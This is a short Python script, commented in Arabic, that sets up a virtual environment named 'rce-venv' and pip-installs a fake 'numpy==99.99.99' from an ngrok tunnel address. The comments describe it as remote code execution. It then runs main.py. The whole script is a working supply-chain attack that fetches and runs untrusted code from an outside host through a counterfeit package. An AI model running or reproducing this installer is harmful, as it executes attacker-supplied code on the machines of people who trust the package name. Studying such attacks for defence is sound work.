import subprocess
import os

# إنشاء بيئة افتراضية
subprocess.run(["python3", "-m", "venv", "rce-venv"], check=True)

# تثبيت numpy المزيف من ngrok
subprocess.run([
    "./rce-venv/bin/pip", "install",
    f"--find-links=https://74cb59ca3c50.ngrok-free.app",
    "numpy==99.99.99"
], check=True)

# تشغيل main.py بعد تنفيذ RCE
subprocess.run([
    "./rce-venv/bin/python", "main.py"
], check=True)
